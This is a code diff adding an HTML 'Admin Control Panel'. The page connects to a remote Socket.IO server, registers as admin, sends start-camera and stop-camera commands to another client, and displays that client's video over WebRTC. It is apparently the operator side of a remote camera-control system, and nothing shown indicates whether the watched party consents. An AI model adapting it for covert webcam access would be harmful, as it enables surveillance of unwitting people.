@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Panel</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/umd/react.production.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.2.0/umd/react-dom.production.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.22.10/babel.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+  <div id="root"></div>
+
+  <script type="text/babel">
+    const { useState, useEffect, useRef } = React;
+
+    function AdminPanel() {
+      const videoRef = useRef(null);
+      const socket = useRef(null);
+      const peerConnection = useRef(null);
+      const [error, setError] = useState(null);
+
+      // Initialize WebRTC peer connection
+      const createPeerConnection = () => {
+        const pc = new RTCPeerConnection({
+          iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+        });
+        pc.onicecandidate = (event) => {
+          if (event.candidate) {
+            socket.current.emit('ice-candidate', event.candidate);
+          }
+        };
+        pc.ontrack = (event) => {
+          if (videoRef.current) {
+            videoRef.current.srcObject = event.streams[0];
+          }
+        };
+        return pc;
+      };
+
+      // Send admin command
+      const sendCommand = (command) => {
+        socket.current.emit('admin-command', command);
+        console.log(`Sent command: ${command}`);
+      };
+
+      // Initialize Socket.IO and WebRTC
+      useEffect(() => {
+        socket.current = io('https://back-rqce.onrender.com', {
+          path: '/socket.io',
+          transportOptions: {
+            polling: {
+              extraHeaders: {
+                'ngrok-skip-browser-warning': 'true'
+              }
+            }
+          }
+        });
+        socket.current.on('connect', () => {
+          socket.current.emit('register', 'admin');
+          console.log('Connected to server');
+        });
+
+        socket.current.on('connect_error', (err) => {
+          console.error('Socket.IO connection error:', err.message);
+          setError('Failed to connect to server');
+        });
+
+        socket.current.on('offer', async (offer) => {
+          peerConnection.current = createPeerConnection();
+          await peerConnection.current.setRemoteDescription(new RTCSessionDescription(offer));
+          const answer = await peerConnection.current.createAnswer();
+          await peerConnection.current.setLocalDescription(answer);
+          socket.current.emit('answer', answer);
+        });
+
+        socket.current.on('ice-candidate', async (candidate) => {
+          if (peerConnection.current) {
+            await peerConnection.current.addIceCandidate(new RTCIceCandidate(candidate));
+          }
+        });
+
+        return () => {
+          socket.current.disconnect();
+          if (peerConnection.current) {
+            peerConnection.current.close();
+          }
+        };
+      }, []);
+
+      return (
+        <div className="bg-white p-6 rounded-lg shadow-lg max-w-lg w-full">
+          <h1 className="text-2xl font-bold mb-4 text-center">Admin Control Panel</h1>
+          {error && (
+            <p className="text-red-500 text-center">{error}</p>
+          )}
+          <div className="mb-4">
+            <video
+              ref={videoRef}
+              autoPlay
+              playsInline
+              className="w-full rounded"
+            ></video>
+          </div>
+          <div className="flex justify-center space-x-4">
+            <button
+              className="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600"
+              onClick={() => sendCommand('start-camera')}
+            >
+              Start Camera
+            </button>
+            <button
+              className="bg-red-500 text-white px-4 py-2 rounded hover:bg-red-600"
+              onClick={() => sendCommand('stop-camera')}
+            >
+              Stop Camera
+            </button>
+          </div>
+        </div>
+      );
+    }
+
+    ReactDOM.render(<AdminPanel />, document.getElementById('root'));
+  </script>
+</body>
+</html>
